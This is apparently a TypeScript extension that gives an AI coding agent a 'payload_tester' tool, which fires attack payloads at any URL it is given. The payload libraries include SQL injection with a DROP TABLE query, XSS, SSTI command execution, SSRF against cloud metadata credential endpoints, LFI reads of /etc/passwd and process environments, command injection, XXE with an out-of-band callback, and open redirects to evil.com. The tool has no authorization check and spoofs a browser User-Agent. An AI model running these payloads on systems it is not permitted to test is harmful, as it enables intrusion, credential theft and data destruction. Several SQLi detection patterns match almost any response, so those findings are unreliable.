/**
 * Payload Tester Extension — Test security payloads with response analysis.
 *
 * Tests payloads against endpoints and analyzes responses for vulnerability
 * indicators. Supports SQLi, XSS, SSTI, SSRF, LFI, command injection,
 * and open redirect payload libraries. Includes timing-based detection.
 */

import { StringEnum } from "@earendil-works/pi-ai";
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { Text } from "@earendil-works/pi-tui";
import { Type } from "typebox";

const VulnTypeEnum = StringEnum(["sqli", "xss", "ssti", "ssrf", "lfi", "cmdi", "open-redirect", "xxe", "custom"] as const);

const PayloadTesterParams = Type.Object({
	url: Type.String({ description: "Target URL with FUZZ placeholder (e.g. https://example.com/search?q=FUZZ)" }),
	vulnType: VulnTypeEnum,
	customPayloads: Type.Optional(Type.Array(Type.String(), { description: "Custom payloads (for vulnType=custom)" })),
	method: Type.Optional(StringEnum(["GET", "POST"] as const, { description: "HTTP method. Default: GET.", default: "GET" })),
	body: Type.Optional(Type.String({ description: "Request body template with FUZZ placeholder (for POST)" })),
	headers: Type.Optional(Type.String({ description: "JSON headers string" })),
	detectionPattern: Type.Optional(Type.String({ description: "Custom regex for detection (optional, uses built-in patterns by default)" })),
	parallel: Type.Optional(Type.Number({ description: "Number of concurrent requests. Default: 5.", default: 5 })),
});

interface PayloadResult {
	payload: string;
	vulnerable: boolean;
	confidence: "high" | "medium" | "low";
	evidence: string;
	duration?: number;
	status?: number;
}

interface PayloadTesterDetails {
	vulnType: string;
	url: string;
	totalTested: number;
	vulnerable: number;
	findings: PayloadResult[];
}

// Payload libraries
const PAYLOADS: Record<string, { name: string; payload: string; indicator: RegExp }[]> = {
	sqli: [
		{ name: "Single quote", payload: "'", indicator: /SQL syntax|mysql_fetch|unclosed quotation|ODBC|SQLite3|PostgreSQL|Warning.*mysql|Microsoft OLE DB|Oracle error|pg_query|near.*syntax|quoted string|unterminated string/i },
		{ name: "Double quote", payload: '"', indicator: /SQL syntax|unclosed quotation|unterminated/i },
		{ name: "OR 1=1", payload: "' OR '1'='1", indicator: /(?!.*(?:error|warning|exception|traceback)).*/i },
		{ name: "OR 1=1 --", payload: "' OR 1=1 --", indicator: /(?!.*(?:error|warning|exception|traceback)).*/i },
		{ name: "UNION SELECT NULL", payload: "' UNION SELECT NULL--", indicator: /(?!.*(?:error|warning|exception|traceback)).*/i },
		{ name: "Sleep time-based", payload: "' OR SLEEP(5)--", indicator: /(?:slow|timeout|timed out)/i },
		{ name: "Boolean true", payload: "' AND 1=1--", indicator: /same.*length|success|valid|found/i },
		{ name: "Boolean false", payload: "' AND 1=2--", indicator: /not found|invalid|error|no results/i },
		{ name: "Stacked query", payload: "'; DROP TABLE users--", indicator: /syntax|unexpected|error/i },
	],
	xss: [
		{ name: "Basic script", payload: "<script>alert(1)</script>", indicator: /<script>alert\(1\)<\/script>/i },
		{ name: "Img onerror", payload: "<img src=x onerror=alert(1)>", indicator: /<img src=x onerror=alert\(1\)>/i },
		{ name: "SVG onload", payload: "<svg onload=alert(1)>", indicator: /<svg onload=alert\(1\)>/i },
		{ name: "Event handler", payload: "\" onfocus=alert(1) autofocus=\"", indicator: /onfocus=alert\(1\)/i },
		{ name: "JavaScript URI", payload: "javascript:alert(1)", indicator: /javascript:alert\(1\)/i },
		{ name: "Tag breakout", payload: "</script><script>alert(1)</script>", indicator: /<script>alert\(1\)<\/script>/i },
		{ name: "Template literal", payload: "${alert(1)}", indicator: /\$\{alert\(1\)\}/i },
		{ name: "Angular expression", payload: "{{constructor.constructor('alert(1)')()}}", indicator: /{{.*}}.*alert/i },
	],
	ssti: [
		{ name: "Basic expr", payload: "{{7*7}}", indicator: /49/ },
		{ name: "Jinja2", payload: "{{config}}", indicator: /SECRET_KEY|DEBUG|SQLALCHEMY|<Config/ },
		{ name: "Twig", payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", indicator: /uid=|gid=|groups=/i },
		{ name: "ERB", payload: "<%= 7*7 %>", indicator: /49/ },
		{ name: "Freemarker", payload: "${7*7}", indicator: /49/ },
		{ name: "Velocity", payload: "#set($x=7*7)$x", indicator: /49/ },
	],
	ssrf: [
		{ name: "Localhost", payload: "http://127.0.0.1:80", indicator: /local|internal|admin|portal|nginx|apache/i },
		{ name: "Localhost alt", payload: "http://localhost", indicator: /local|internal|admin|portal|nginx|apache/i },
		{ name: "Decimal IP", payload: "http://2130706433", indicator: /local|internal|admin|portal/i },
		{ name: "AWS metadata", payload: "http://169.254.169.254/latest/meta-data/", indicator: /ami-id|instance-id|security-credentials|public-keys/i },
		{ name: "GCP metadata", payload: "http://metadata.google.internal/computeMetadata/v1/", indicator: /instance|project|service-accounts/i },
		{ name: "DNS rebinding", payload: "http://nip.io/127.0.0.1", indicator: /local|internal|admin/i },
	],
	lfi: [
		{ name: "etc/passwd", payload: "../../../../etc/passwd", indicator: /root:.*:0:0:/ },
		{ name: "etc/passwd null", payload: "../../../../etc/passwd%00", indicator: /root:.*:0:0:/ },
		{ name: "Windows hosts", payload: "../../../../Windows/System32/drivers/etc/hosts", indicator: /localhost|127\.0\.0\.1|::1/ },
		{ name: "etc/hosts", payload: "../../../../etc/hosts", indicator: /localhost|127\.0\.0\.1|::1/ },
		{ name: "PHP filter", payload: "php://filter/convert.base64-encode/resource=index.php", indicator: /^[A-Za-z0-9+/=]{50,}$/ },
		{ name: "proc/self", payload: "../../../../proc/self/environ", indicator: /PATH=|HOME=|USER=/ },
	],
	cmdi: [
		{ name: "Sleep time", payload: "; sleep 5", indicator: /(?:slow|timeout|timed out)/i },
		{ name: "Pipe sleep", payload: "| sleep 5", indicator: /(?:slow|timeout|timed out)/i },
		{ name: "Backtick id", payload: "`id`", indicator: /uid=\d+\(/ },
		{ name: "Dollar id", payload: "$(id)", indicator: /uid=\d+\(/ },
		{ name: "Windows dir", payload: "& dir", indicator: /Volume|Directory of|<\s*DIR\s*>/i },
		{ name: "Windows type", payload: "& type C:\\Windows\\System32\\drivers\\etc\\hosts", indicator: /localhost|127\.0\.0\.1/ },
	],
	"open-redirect": [
		{ name: "Full URL", payload: "https://evil.com", indicator: /Location:.*evil\.com/i },
		{ name: "Double slash", payload: "//evil.com", indicator: /Location:.*evil\.com/i },
		{ name: "Backslash", payload: "\\evil.com", indicator: /Location:.*evil\.com/i },
		{ name: "At sign", payload: "https://target.com@evil.com", indicator: /Location:.*evil\.com/i },
		{ name: "Encoded", payload: "https%3A%2F%2Fevil.com", indicator: /Location:.*evil\.com/i },
	],
	xxe: [
		{ name: "Basic XXE", payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', indicator: /root:.*:0:0:/ },
		{ name: "XXE param", payload: '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR"> %xxe;]>', indicator: /(?:request|callback|ping).*COLLABORATOR/i },
	],
};

async function testPayload(url: string, method: string, bodyTemplate: string | undefined, headersJson: string | undefined, payload: string): Promise<{ status: number; body: string; duration: number; headers: Record<string, string> }> {
	const finalUrl = url.replace(/FUZZ/gi, encodeURIComponent(payload));
	let finalBody: string | undefined;
	if (bodyTemplate) {
		finalBody = bodyTemplate.replace(/FUZZ/gi, payload);
	}

	let parsedHeaders: Record<string, string> = {};
	if (headersJson) {
		try { parsedHeaders = JSON.parse(headersJson); } catch { /* ignore */ }
	}

	const headersInit: Record<string, string> = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Accept": "*/*",
		...parsedHeaders,
	};

	const start = Date.now();
	const controller = new AbortController();
	const timer = setTimeout(() => controller.abort(), 15000);

	try {
		const init: RequestInit = { method, headers: headersInit, signal: controller.signal };
		if (finalBody && method !== "GET") init.body = finalBody;
		const res = await fetch(finalUrl, init);
		clearTimeout(timer);
		const body = await res.text();
		const responseHeaders: Record<string, string> = {};
		res.headers.forEach((v, k) => { responseHeaders[k.toLowerCase()] = v; });
		return { status: res.status, body, duration: Date.now() - start, headers: responseHeaders };
	} catch {
		clearTimeout(timer);
		return { status: 0, body: "", duration: Date.now() - start, headers: {} };
	}
}

export default function (pi: ExtensionAPI) {
	pi.registerTool({
		name: "payload_tester",
		label: "Payload Tester",
		description: "Test security payloads against endpoints with automatic response analysis. Supports SQLi, XSS, SSTI, SSRF, LFI, command injection, open redirect, XXE, and custom payloads.",
		parameters: PayloadTesterParams,
		promptSnippet: "Test a URL with common security payloads. Replace the injection point with FUZZ.",
		promptGuidelines: [
			"Use payload_tester to quickly triage parameters for common vulnerability classes",
			"Replace the parameter value with FUZZ in the URL: /search?q=FUZZ",
			"Use vulnType=custom with customPayloads for specific fuzzing needs",
			"Set detectionPattern to override detection logic for edge cases",
			"Review the 'evidence' field to understand what triggered detection",
			"A positive result means the indicator was found — manual verification still needed",
		],

		async execute(_toolCallId, params, _signal, onUpdate, _ctx) {
			const vulnType = params.vulnType as string;
			const customPayloads = params.customPayloads as string[] | undefined;
			const method = (params.method as string) || "GET";
			const headersJson = params.headers as string | undefined;
			const bodyTemplate = params.body as string | undefined;
			const detectionPattern = params.detectionPattern as string | undefined;
			const parallel = params.parallel as number || 5;
			const url = params.url;

			if (!url.includes("FUZZ")) {
				return {
					content: [{ type: "text", text: "Error: URL must contain FUZZ as placeholder for the injection point." }],
					details: { vulnType, url, totalTested: 0, vulnerable: 0, findings: [] } as PayloadTesterDetails,
				};
			}

			const payloads = vulnType === "custom"
				? (customPayloads || []).map((p: string) => ({ name: p.slice(0, 30), payload: p, indicator: detectionPattern ? new RegExp(detectionPattern, "i") : /.*/ }))
				: (PAYLOADS[vulnType] || []);

			if (payloads.length === 0) {
				return {
					content: [{ type: "text", text: `No payloads available for vulnType=${vulnType}. Use custom payloads.` }],
					details: { vulnType, url, totalTested: 0, vulnerable: 0, findings: [] } as PayloadTesterDetails,
				};
			}

			if (onUpdate) {
				onUpdate({
					content: [{ type: "text", text: `Testing ${payloads.length} payloads for ${vulnType}...` }],
					details: { vulnType, url, totalTested: 0, vulnerable: 0, findings: [] } as PayloadTesterDetails,
				});
			}

			// Test payloads with concurrency control
			const results: PayloadResult[] = [];
			const batchSize = Math.min(parallel, payloads.length);

			for (let i = 0; i < payloads.length; i += batchSize) {
				const batch = payloads.slice(i, i + batchSize);
				const batchResults = await Promise.all(
					batch.map(async (p) => {
						const res = await testPayload(url, method, bodyTemplate, headersJson, p.payload);
						const customRe = detectionPattern ? new RegExp(detectionPattern, "i") : p.indicator;
						const bodyMatches = customRe.test(res.body);
						const headerMatches = Object.values(res.headers).some((v) => customRe.test(v));

						let confidence: PayloadResult["confidence"] = "low";
						let evidence = "";

						if (bodyMatches || headerMatches) {
							if (vulnType === "sqli" && res.duration > 4000) confidence = "high";
							else if (vulnType === "cmdi" && res.duration > 4000) confidence = "high";
							else if (vulnType === "ssrf" && res.status >= 200 && res.status < 400) confidence = "high";
							else if (vulnType === "lfi" && bodyMatches) confidence = "high";
							else if (bodyMatches && headerMatches) confidence = "medium";
							else confidence = "medium";

							const matchInBody = customRe.exec(res.body);
							if (matchInBody) {
								const idx = matchInBody.index;
								evidence = res.body.slice(
									Math.max(0, idx - 30),
									Math.min(res.body.length, idx + matchInBody[0].length + 30),
								).replace(/\n/g, "\\n");
							} else if (headerMatches) {
								evidence = `Header match: ${Object.entries(res.headers).filter(([, v]) => customRe.test(v)).map(([k]) => k).join(", ")}`;
							}
						}

						return {
							payload: p.name,
							vulnerable: bodyMatches || headerMatches,
							confidence,
							evidence: evidence.slice(0, 200),
							duration: res.duration,
							status: res.status,
						};
					}),
				);
				results.push(...batchResults);

				if (onUpdate) {
					onUpdate({
						content: [{ type: "text", text: `${Math.min(i + batchSize, payloads.length)}/${payloads.length} tested...` }],
						details: { vulnType, url, totalTested: results.length, vulnerable: results.filter(r => r.vulnerable).length, findings: results.filter(r => r.vulnerable) } as PayloadTesterDetails,
					});
				}
			}

			const vulnerable = results.filter((r) => r.vulnerable);
			const highConf = vulnerable.filter((r) => r.confidence === "high");
			const medConf = vulnerable.filter((r) => r.confidence === "medium");
			const lowConf = vulnerable.filter((r) => r.confidence === "low");

			let output = `## Payload Test: ${vulnType.toUpperCase()} on ${url}\n\n`;
			output += `Tested: ${results.length} payloads\n`;
			output += `Results: ${vulnerable.length} potential findings `;
			output += `(${highConf.length} high, ${medConf.length} medium, ${lowConf.length} low confidence)\n\n`;

			if (vulnerable.length > 0) {
				output += "### Positive Findings\n\n";
				for (const r of vulnerable) {
					const confIcon = r.confidence === "high" ? "!!!" :
						r.confidence === "medium" ? "!!" : "!";
					output += `- ${confIcon} **${r.payload}** `;
					if (r.status) output += `[${r.status}] `;
					if (r.duration) output += `(${r.duration}ms) `;
					output += `\n  Evidence: \`${r.evidence || "detected"}\`\n`;
				}
				output += "\n*Manual verification required. False positives are common in automated testing.*\n";
			} else {
				output += "No vulnerabilities detected with the tested payloads.\n";
			}

			if (results.filter(r => !r.vulnerable).length > 0 && vulnerable.length === 0) {
				output += "\n### Non-Vulnerable (sample)\n";
				for (const r of results.filter(r => !r.vulnerable).slice(0, 4)) {
					output += `- ${r.payload} [${r.status}] (${r.duration}ms) — clean\n`;
				}
			}

			return {
				content: [{ type: "text", text: output }],
				details: {
					vulnType,
					url,
					totalTested: results.length,
					vulnerable: vulnerable.length,
					findings: vulnerable,
				} as PayloadTesterDetails,
			};
		},

		renderCall(args, theme, _context) {
			const vulnType = (args.vulnType as string) || "...";
			const url = (args.url as string) || "...";
			const shortUrl = url.replace(/FUZZ/gi, "⟦FUZZ⟧").slice(0, 40);
			return new Text(
				theme.fg("toolTitle", theme.bold("payload ")) +
					theme.fg("accent", vulnType.toUpperCase()) +
					" " +
					theme.fg("dim", shortUrl),
				0,
				0,
			);
		},

		renderResult(result, _opts, theme, _context) {
			const details = result.details as PayloadTesterDetails | undefined;
			if (!details) return new Text("", 0, 0);
			if (details.totalTested === 0) {
				return new Text(theme.fg("error", "No payloads tested"), 0, 0);
			}
			if (details.vulnerable === 0) {
				return new Text(
					theme.fg("muted", `${details.totalTested} tested, `) +
						theme.fg("dim", "no findings"),
					0,
					0,
				);
			}
			const highConf = details.findings.filter(f => f.confidence === "high").length;
			return new Text(
				theme.fg("warning", `${details.vulnerable} findings `) +
					theme.fg("muted", `(${highConf} high confidence) `) +
					theme.fg("dim", `of ${details.totalTested} payloads`),
				0,
				0,
			);
		},
	});
}
